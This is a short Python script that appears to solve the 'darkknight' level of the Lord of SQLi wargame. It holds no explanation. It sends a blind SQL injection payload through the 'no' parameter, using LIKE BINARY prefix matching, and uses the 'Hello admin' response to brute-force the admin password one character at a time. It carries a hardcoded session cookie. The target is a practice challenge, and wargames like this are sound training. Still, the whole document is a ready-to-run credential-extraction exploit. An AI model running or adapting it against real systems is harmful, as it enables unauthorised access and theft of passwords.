# LordofSQLi: darkknight
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
cookies = {'PHPSESSID': 'eogiu2tfngm3jtahtf8su6g4ua'}

passwd = ''
while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'no': '-1 OR id LIKE BINARY "admin" && pw LIKE BINARY "{}%"#'.format(passwd + c)}
        r = requests.get(url, params=payload, cookies=cookies)
        print(c, end='', flush=True)
        if 'Hello admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break
print('\n->' + passwd)
